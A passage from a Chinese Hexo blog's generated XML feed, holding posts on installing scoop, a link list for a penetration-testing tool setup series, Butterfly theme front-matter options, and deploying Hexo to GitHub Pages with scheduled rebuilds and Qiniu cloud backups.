hash值</span><br><span class="line">    &quot;bin&quot;:  &quot;&quot; // 应用程序名</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">scoop install .\app.json</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 包管理器 </tag>
            
            <tag> scoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x01 - 环境搭建</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/0x01-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/0x01-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="渗透工具环境安装"><a href="#渗透工具环境安装" class="headerlink" title="渗透工具环境安装"></a><strong>渗透工具环境安装</strong></h1><h2 id="scoop-包管理器"><a href="#scoop-包管理器" class="headerlink" title="scoop 包管理器"></a><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/scoop-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/">scoop 包管理器</a></h2><h2 id="Java环境安装"><a href="#Java环境安装" class="headerlink" title="Java环境安装"></a><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/">Java环境安装</a></h2><h2 id="Python环境安装"><a href="#Python环境安装" class="headerlink" title="Python环境安装"></a>Python环境安装</h2><blockquote><p><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Python%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/">Python环境安装</a></p></blockquote><h1 id="Linux-Kali配置与使用"><a href="#Linux-Kali配置与使用" class="headerlink" title="Linux-Kali配置与使用"></a><strong><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali&Linux/Linux-Kali%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85/">Linux-Kali配置与使用</a></strong></h1><h2 id="VMware软件安装"><a href="#VMware软件安装" class="headerlink" title="VMware软件安装"></a><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/vmware%E4%BD%BF%E7%94%A8/">VMware软件安装</a></h2><h2 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a><a href="https://11pmsleep.github.io/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali&Linux/Linux%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/">Linux基础</a></h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo教程-写作markdown内的配置</title>
      <link href="/hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%86%99%E4%BD%9Cmarkdown%E5%86%85%E7%9A%84%E9%85%8D%E7%BD%AE.html"/>
      <url>/hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%86%99%E4%BD%9Cmarkdown%E5%86%85%E7%9A%84%E9%85%8D%E7%BD%AE.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li><p>Front-matter</p><blockquote><p>Front-matter 是 markdown 文件最上方以 — 分隔的区域，用于指定个别档案的变数。</p><blockquote><p>Page Front-matter 用于页面配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title【必需】页面标题</span><br><span class="line">date【必需】页面创建日期</span><br><span class="line">type【必需】标籤、分类和友情链接三个页面需要配置</span><br><span class="line">updated【可选】页面更新日期</span><br><span class="line">description【可选】页面描述</span><br><span class="line">keywords【可选】页面关键字</span><br><span class="line">comments【可选】显示页面评论模块(默认 true)</span><br><span class="line">top_img【可选】页面顶部图片</span><br><span class="line">mathjax【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</span><br><span class="line">katex【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</span><br><span class="line">aside【可选】显示侧边栏 (默认 true)</span><br><span class="line">aplayer【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight_shrink【可选】配置代码框是否展开(true/false)(默认为设置中highlight_shrink的配置)</span><br></pre></td></tr></table></figure><p>Post Front-matter 用于文章页配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title【必需】文章标题</span><br><span class="line">date【必需】文章创建日期</span><br><span class="line">updated【可选】文章更新日期</span><br><span class="line">tags【可选】文章标籤</span><br><span class="line">categories【可选】文章分类</span><br><span class="line">keywords【可选】文章关键字</span><br><span class="line">description【可选】文章描述</span><br><span class="line">top_img【可选】文章顶部图片</span><br><span class="line">cover【可选】文章缩略图(如果没有设置top_img,文章页顶部将显示缩略图，可设为false/图片地址/留空)</span><br><span class="line">comments【可选】显示文章评论模块(默认 true)</span><br><span class="line">toc【可选】显示文章TOC(默认为设置中toc的enable配置)</span><br><span class="line">toc_number【可选】显示toc_number(默认为设置中toc的number配置)</span><br><span class="line">toc_style_simple【可选】显示 toc 简洁模式</span><br><span class="line">copyright【可选】显示文章版权模块(默认为设置中post_copyright的enable配置)</span><br><span class="line">mathjax【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</span><br><span class="line">katex【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</span><br><span class="line">aplayer【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight_shrink【可选】配置代码框是否展开(true/false)(默认为设置中highlight_shrink的配置)</span><br><span class="line">aside【可选】显示侧边栏 (默认 true)</span><br><span class="line">top:置顶</span><br><span class="line">sticky: 1你可以直接在文章的front-matter区域里添加属性来把这篇文章置顶。数值越大，置顶的优先级越大。</span><br><span class="line">toc_max_depth:最大几级目录</span><br><span class="line">link:标题的链接</span><br><span class="line">photos:</span><br></pre></td></tr></table></figure></blockquote></blockquote></li><li><p>文章页 的 top_img ，请到对应的 md 页面，设置front-matter中的top_img</p></li></ul><p>属性值：</p><blockquote><ul><li><p>留空</p></li><li><p>true - 可选择颜色：</p><blockquote><ul><li><p>HEX值 - #0000FF</p></li><li><p>RGB值 - rgb(0,0,255)</p></li><li><p>顔色单词 - orange</p></li><li><p>渐变色 - linear-gradient( 135deg, #E2B0FF 10%, #9F44D3 100%)</p><p>​  linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)</p></li></ul></blockquote></li><li><p>false - 显示默认的顔色</p></li><li><p>transparent - 透明</p></li><li><p>img链接：相对或者绝对路径</p></li></ul></blockquote><ul><li><p>文章封面:文章的markdown文档上,在Front-matter添加cover,并填上要显示的图片地址。如果不配置cover,可以设置显示默认的cover.(已经设置了很多张随机了~~)</p></li><li><p>如果有文章（例如：转载文章）不需要显示版权，可以在文章Front-matter单独设置<code>copyright: false</code></p></li><li><p>在文章页，会有一个目录，用于显示TOC。可以为特定的文章配置，在你的文章md文件的头部，加入toc_number和toc，并配置true或者false即可。主题会优先判断文章Markdown的Front-matter是否有配置，如有，则以Front-matter的配置为准。否则，以主题配置文件中的配置为准</p></li><li><p>如果你需要展示的内容太多，可以把它隐藏在收缩框里，需要时再把它展开。( display 不能包含英文逗号，可用&amp;sbquo;)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% hideToggle display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideToggle %&#125;</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">&#123;% hideToggle Butterfly安装方法 %&#125;</span><br><span class="line">在你的博客根目录里</span><br><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br><span class="line">如果想要安装比较新的dev分支，可以</span><br><span class="line">git clone -b dev https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br><span class="line">&#123;% endhideToggle %&#125;</span><br></pre></td></tr></table></figure></li><li><p>Tabs使用方法</p></li></ul><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line">Unique name   : Unique name of tabs block tag without comma.</span><br><span class="line"><span class="code">                Will be used in #id&#x27;s as prefix for each tab with their index numbers.</span></span><br><span class="line"><span class="code">                If there are whitespaces in name, for generate #id all whitespaces will replaced by dashes.</span></span><br><span class="line"><span class="code">                Only for current url of post/page must be unique!</span></span><br><span class="line"><span class="code">[index]       : Index number of active tab.</span></span><br><span class="line"><span class="code">                If not specified, first tab (1) will be selected.</span></span><br><span class="line"><span class="code">                If index is -1, no tab will be selected. It&#x27;s will be something like spoiler.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br><span class="line"><span class="code">[Tab caption] : Caption of current tab.</span></span><br><span class="line"><span class="code">                If not caption specified, unique name with tab index suffix will be used as caption of tab.</span></span><br><span class="line"><span class="code">                If not caption specified, but specified icon, caption will empty.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br><span class="line"><span class="code">[@icon]       : FontAwesome icon name (full-name, look like &#x27;fas fa-font&#x27;)</span></span><br><span class="line"><span class="code">                Can be specified with or without space; e.g. &#x27;Tab caption @icon&#x27; similar to &#x27;Tab caption@icon&#x27;.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br></pre></td></tr></table></figure><p>Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><ul><li>评论数据管理</li></ul><p>由于Valine 是无后端评论系统，所以也就没有开发评论数据管理功能。请自行登录<code>Leancloud应用</code>管理。</p><p>具体步骤：<code>登录</code>&gt;<code>选择你创建的应用</code>&gt;<code>存储</code>&gt;选择Class <code>Comment</code>，然后就可以尽情的发挥你的权利啦(～￣▽￣)～</p><blockquote><p>当然，你也可以配合 <a href="https://github.com/DesertsP">@DesertsP</a> 开发的 <a href="https://github.com/DesertsP/Valine-Admin">Valine-Admin</a> 进行<code>评论数据管理</code></p></blockquote><p>注意事项</p><p>在 Hexo 博客中，评论的功能在所有页面都默认开启，但是有的时候我们在页面上不需要显示评论功能，例如分类，标记页面我们并不需要评论功能。</p><p>在 <code>Front-matter</code> 中通过<code>comments</code>属性设置<code>true</code>或<code>false</code>控制该页面或者是文章的评论功能是否打开，如下：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: Tags</span><br><span class="line">date: 2019-12-19 16:10:19</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">comments: false</span><br></pre></td></tr></table></figure><ul><li>hexo设置永久文内链接，自定义跳转到本站的其他博客：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% post_link 文章文件名(不要后缀) 显示文字(可自定义，一般写文章标题) %&#125;</span><br></pre></td></tr></table></figure><p>refer:</p><blockquote><ul><li><a href="https://butterfly.js.org/posts/4aa8abbe/#timeline">Butterfly 安装文档(三) 主题配置-1</a></li><li><a href="https://www.jianshu.com/p/b9e73c881729">Hexo 集成 Valine 评论系统</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> hexo教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo教程-在GitHub部署hexo个人博客</title>
      <link href="/hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%9C%A8GitHub%E9%83%A8%E7%BD%B2hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.html"/>
      <url>/hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%9C%A8GitHub%E9%83%A8%E7%BD%B2hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>由于比较懒不想操心博客的运维，而且腾讯云的服务器也快到期了，就先将Blog部署在GitHub上吧。</p><h1 id="hexo简介"><a href="#hexo简介" class="headerlink" title="hexo简介"></a>hexo简介</h1><p>hexo是一款快速、简洁且高效的博客框架，支持markdown写作（选择hexo的另一个原因），可以快速的生成静态网页，而且插件丰富。优点还是不少，就不一一赘述。附上官网链接。</p><blockquote><p><a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></p></blockquote><h1 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h1><p>安装 Hexo 相当简单，只需要先安装node.js和git（git安装方法自行百度）</p><blockquote><ul><li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a></li><li><a href="https://blog.csdn.net/antma/article/details/86104068">node.js安装参考这位大佬的教程</a></li></ul></blockquote><ol><li>npm安装hexo包</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装完hexo包可用<code>npm hexo-cli -v</code>查看版本，相应的目录下会有变化</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142002229.png" alt="image-20220814200222125" style="zoom:50%;" /><ol start="2"><li>将 Hexo 所在的目录下的 <code>node_modules</code> 添加到环境变量之中即可直接使用 <code>hexo &lt;command&gt;</code>，执行命令</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141958704.png" alt="image-20220814195830542" style="zoom:50%;" /><ol start="3"><li>开始建站，执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init .\myblog</span><br><span class="line">cd myblog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142012267.png" alt="image-20220814201251111" style="zoom:50%;" /><blockquote><p>这些目录里面放了什么文件可以参考<a href="https://hexo.io/zh-cn/docs/setup">官方文档</a></p></blockquote><h1 id="使用hexo创作"><a href="#使用hexo创作" class="headerlink" title="使用hexo创作"></a>使用hexo创作</h1><ol><li>新建FirstBlog，执行下面命令后，会自动在<code>myblog\source\\_posts</code>目录下创建名为<code>firtblog.md</code>的文件</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;FirstBlog&quot;</span></span><br><span class="line">或者简写为</span><br><span class="line">hexo n <span class="string">&quot;FirstBlog&quot;</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142028651.png" alt="image-20220814202817526" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142030299.png" alt="image-20220814203052183" style="zoom:50%;" /><ol start="2"><li>hexo渲染markdown文件，生成html等静态页面：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">或者</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>生成的文件都在<code>myblog\public</code>目录下</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142036923.png" alt="image-20220814203631732" style="zoom:50%;" /><ol start="3"><li>本地启动服务测试一下：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br><span class="line">或者</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142038525.png" alt="image-20220814203848381" style="zoom:50%;" /><blockquote><p>这个服务开启的端口可以myblog\node_modules&#x2F;hexo-server&#x2F;index.js 文件中修改(因为有时候存在端口占用的情况)</p></blockquote><p>这个时候可以看到，成功了，但是略丑~，不急，后面可以换主题美化-</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142044320.png" alt="image-20220814204418980" style="zoom:50%;" /><h1 id="GitHub部署Blog"><a href="#GitHub部署Blog" class="headerlink" title="GitHub部署Blog"></a>GitHub部署Blog</h1><ol><li>先在GitHub上创立一个仓库，单击new~，：</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142017620.png" alt="image-20220814201720473" style="zoom:50%;" /><ol start="2"><li>Repository name设为<code>Yourname.github.io</code>，其他默认即可</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142021969.png" alt="image-20220814202142829" style="zoom:50%;" /><p>可以在setting中查看是否成功，若成功会显示url：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142213278.png" alt="image-20220814221305122" style="zoom: 33%;" /><ol start="3"><li>打开<code>myblog\\_config.yml</code>这个文件，可以自行配置，参数太多不一一讲解。需要注意的是deploy选项</li></ol><blockquote><p>同理参考官方文档：<a href="https://hexo.io/zh-cn/docs/configuration">https://hexo.io/zh-cn/docs/configuration</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142048690.png" alt="image-20220814204826516" style="zoom:50%;" /><p>找到deploy选项：</p><blockquote><ul><li><p>同理可以参考官方文档：<a href="https://hexo.io/docs/one-command-deployment">https://hexo.io/docs/one-command-deployment</a></p></li><li><p><strong>注意yaml文件中的缩进</strong>：YAML依靠缩进来确定元素间的从属关系。因此，请确保每个deployer的缩进长度相同，并且使用空格缩进。</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://bitbucket.org/John/john.bitbucket.io  #修改为自己GitHub仓库的url</span><br><span class="line">  branch: main#主分支，因人而异</span><br></pre></td></tr></table></figure><ol start="4"><li>git安装部署插件 <a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><ol start="5"><li>重新生成站点文件并推送至远程库</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate </span><br><span class="line">hexo deploy</span><br><span class="line">解释：</span><br><span class="line">hexo clean   #清除缓存文件 db.json 和已生成的静态文件 public</span><br><span class="line">hexo generate  #渲染 生成静态文件</span><br><span class="line">hexo deploy       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)</span><br></pre></td></tr></table></figure><ol start="6"><li>打开浏览器，输入自己的url：<a href="https://11pmsleep.github.io/">https://11pmsleep.github.io/</a> 就可以看到是否成功：</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142207744.png" alt="image-20220814220707328" style="zoom: 33%;" /><h1 id="自动化部署hexo-简化每次写博客的繁琐操作"><a href="#自动化部署hexo-简化每次写博客的繁琐操作" class="headerlink" title="自动化部署hexo-简化每次写博客的繁琐操作"></a>自动化部署hexo-简化每次写博客的繁琐操作</h1><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">比如说hexo每隔三十分钟自动更新</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">不能同时用两次双引号怎么办？</span></span><br><span class="line">schtasks /create /sc MINUTE /mo 30 /tn hexo_update /tr &quot;cmd /c &quot;F: &amp;&amp; cd F:\Haoran\桌面\myblog &amp;&amp; hexo g -d&quot;&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这个命令却意外的生成了正确的计划任务</span></span><br><span class="line">schtasks /create /sc MINUTE /mo 30 /tn hexo_update /tr &quot;cmd /c &#x27;F: &amp;&amp; cd F:\Haoran\桌面\myblog &amp;&amp; hexo g -d&quot;&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行结果</span></span><br><span class="line">成功: 成功创建计划任务 &quot;hexo_update&quot;。</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输入taskschd.msc查看计划任务</span></span><br></pre></td></tr></table></figure><h3 id="图形化界面（推荐）"><a href="#图形化界面（推荐）" class="headerlink" title="图形化界面（推荐）"></a>图形化界面（推荐）</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022159661.png" alt="image-20220902215958413" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022209833.png" alt="image-20220902220949582" style="zoom: 33%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210135.png" alt="image-20220902221014958" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210895.png" alt="image-20220902221042649" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209022210792.png" alt="image-20220902221059540" style="zoom:50%;" /><h2 id="批处理文件或者bash脚本"><a href="#批处理文件或者bash脚本" class="headerlink" title="批处理文件或者bash脚本"></a>批处理文件或者bash脚本</h2><blockquote><p>hexo_update.bat</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chdir</span> F:\Haoran\桌面\myblog </span><br><span class="line">hexo g <span class="literal">-d</span></span><br></pre></td></tr></table></figure><h2 id="定时备份hexo所以文件"><a href="#定时备份hexo所以文件" class="headerlink" title="定时备份hexo所以文件"></a>定时备份hexo所以文件</h2><blockquote><p>因为该文件夹下主题文件里面有.git了，不方面在博客的根目录下面再push到github上，，，</p><p>但是这些笔记不再存在有道云了，很怕有一天电脑突然宕机，所有宝贝文件都丢失了，，，</p><p>所以还是想想办法怎么定时的备份博客文件夹吧（或者其他重要的内容</p></blockquote><p>还是一样的思路用Windows的定时任务去做这件事，</p><p>最终决定上传到七牛云对象存储上面~免费空间有10个G，完全够用了，，，</p><p>主要是七牛云提供了命令行工具给我们去做这件事</p><blockquote><p><a href="https://developer.qiniu.com/kodo/1302/qshell">命令行工具(qshell)文档</a></p><p><a href="https://devtools.qiniu.com/qshell-v2.9.0-windows-amd64.zip?ref=developer.qiniu.com">Windows amd64版本</a></p></blockquote><p>如果希望可以在任意目录下使用<code>qshell</code>，请将<code>qshell</code>工具可执行文件所在目录添加到系统的环境变量中。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210062236402.png" alt="image-20221006223603131" style="zoom:50%;" /><p>上传文件的命令：<code>fput</code></p><blockquote><p><a href="https://github.com/qiniu/qshell/blob/master/docs/fput.md">https://github.com/qiniu/qshell/blob/master/docs/fput.md</a></p><p><code>fput</code> 命令用来以 <code>multipart/form-data</code> 的表单方式上传一个文件。适合于中小型文件的上传，一般建议如果文件大小超过100MB的话，都使用分片上传。</p><p><strong>鉴权</strong></p><p>需要在使用了 <code>account</code> 设置了 <code>AccessKey</code>, <code>SecretKey</code> 和 <code>Name</code> 的情况下使用。</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">qshell fput [--overwrite] [--callback-urls &lt;CallbackUrls&gt;] [--callback-host &lt;CallbackHost&gt;] [--storage &lt;StorageType&gt;] [--mimetype &lt;MimeType&gt;] &lt;Bucket&gt; &lt;Key&gt; &lt;LocalFile&gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>参数</strong></p><ul><li>Bucket：七牛空间名称，可以为公开空间或私有空间【必选】</li><li>Key：文件保存在七牛空间的名称 【必选】</li><li>LocalFile：本地文件的路径【必选】</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">--overwrite：是否覆盖空间已有文件，默认为<span class="literal">false</span>。 【可选】</span><br><span class="line">--mimetype：指定文件的 MimeType。 【可选】</span><br><span class="line">--storage：文件存储类型，默认为0(标准存储），1为低频存储，2为归档存储，3为深度归档存储，【可选】</span><br><span class="line">--up-host: 指定上传域名 【可选】</span><br><span class="line">--callback-urls：上传回调地址， 可以指定多个地址，以逗号分隔 【可选】</span><br><span class="line">--callback-host：上传回调的HOST, 必须和CallbackUrls一起指定 【可选】</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">qshell fput hexobackup myblog/myblog_backup.tar.gz F:\BackupFile\myblog_backup.tar.gz</span><br></pre></td></tr></table></figure><p>再一个计划任务用的bat脚本：</p><p>这是主要需要使用到的两条命令：分别是备份myblog文件夹和上传至七牛云</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar -zcvf F:\BackupFile\myblog_backup.tar.gz F:\Haoran\桌面\myblog\*</span><br><span class="line">qshell fput hexobackup myblog_backup.tar.gz F:\BackupFile\myblog_backup.tar.gz</span><br></pre></td></tr></table></figure><blockquote><p>myblog_backup.bat</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> =========日期时间按照YYYYMMDD_HHMMSS格式显示=============  </span><br><span class="line"><span class="built_in">set</span> CURRENT_DATE_TIME_STAMP=%<span class="built_in">date</span>:~0,4%%<span class="built_in">date</span>:~5,2%%<span class="built_in">date</span>:~8,2%_%time:~0,2%%time:~3,2%%time:~6,2%  </span><br><span class="line"><span class="built_in">echo</span> %CURRENT_DATE_TIME_STAMP%  </span><br><span class="line">@<span class="built_in">echo</span> =========================================================  </span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:: 去掉所有空格空格</span><br><span class="line">:: Code by JM 2006-11-28 CMD@XP</span><br><span class="line">:: 出处：http://www.cn-dos.net/forum/viewthread.php?tid=25172</span><br><span class="line"><span class="built_in">set</span> <span class="string">&quot;CURRENT_DATE_TIME_STAMP=%CURRENT_DATE_TIME_STAMP: =%&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;☆%CURRENT_DATE_TIME_STAMP%☆Start copy~~~&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tar -zcvf F:\BackupFile\myblog_backup.tar.gz F:\Haoran\桌面\myblog\*</span><br><span class="line">qshell fput hexobackup myblog/myblog_%CURRENT_DATE_TIME_STAMP%.tar.gz F:\BackupFile\myblog_backup.tar.gz</span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> =========备份完成=============  </span><br></pre></td></tr></table></figure><p>再在<code>taskschd.msc</code>使用定时任务每两天备份一次好啦~~~~</p><p>ook！</p><h1 id="换个好看的主题"><a href="#换个好看的主题" class="headerlink" title="换个好看的主题~"></a>换个好看的主题~</h1><blockquote><p>换主题同样是参考文档：<a href="https://hexo.io/zh-cn/docs/themes">https://hexo.io/zh-cn/docs/themes</a></p><p>总而言之~文档里什么都有</p></blockquote><p>我选用的是<a href="https://butterfly.js.org/posts/21cfbf15/">butterfly</a>，因为这个名字很喜欢</p><h2 id="步骤"><a href="#步骤" 